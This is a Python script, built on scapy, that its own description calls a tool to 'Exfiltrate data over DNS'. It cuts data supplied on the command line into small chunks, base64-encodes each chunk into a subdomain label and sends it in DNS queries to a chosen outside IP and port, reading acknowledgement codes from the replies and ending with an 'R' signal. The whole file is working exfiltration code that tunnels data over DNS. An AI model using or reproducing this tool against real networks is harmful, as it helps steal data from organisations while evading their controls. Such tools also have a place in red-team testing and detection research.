import argparse
from scapy.all import *
from base64 import b64encode

def process(response):
    code = str(response[DNS].an.rdata)[-1]
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Acknowledged end transmission")
    else:
        print("Transmission error")

def DNSRequest(subdomain, ip, domain, port):
    d = bytes(subdomain + "." + domain, "utf-8")
    query = DNSQR(qname=d)
    mac = get_if_hwaddr(conf.iface)
    p = Ether(src=mac, dst=mac) / IP(dst=ip) / UDP(dport=port) / DNS(qd=query)
    result = srp1(p, verbose=False)
    process(result)

def sendData(data, ip, domain, port):
    for i in range(0, len(data), 10):
        chunk = data[i:min(i+10, len(data))]
        print("Transmitting %s" % chunk)
        encoded = b64encode(bytes(chunk, "utf-8"))
        print(encoded)
        encoded = encoded.decode("utf-8").rstrip("=")
        DNSRequest(encoded, ip, domain, port)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exfiltrate data over DNS.")
    parser.add_argument("ip", help="The IP address to send data to.")
    parser.add_argument("domain", help="The domain to use for DNS requests.")
    parser.add_argument("data", help="The data to be exfiltrated.")
    parser.add_argument("port", type=int, help="The UDP destination port.")
    
    args = parser.parse_args()
    
    sendData(args.data, args.ip, args.domain, args.port)
    # Send the "R" signal to indicate end of transmission
    sendData("R", args.ip, args.domain, args.port)
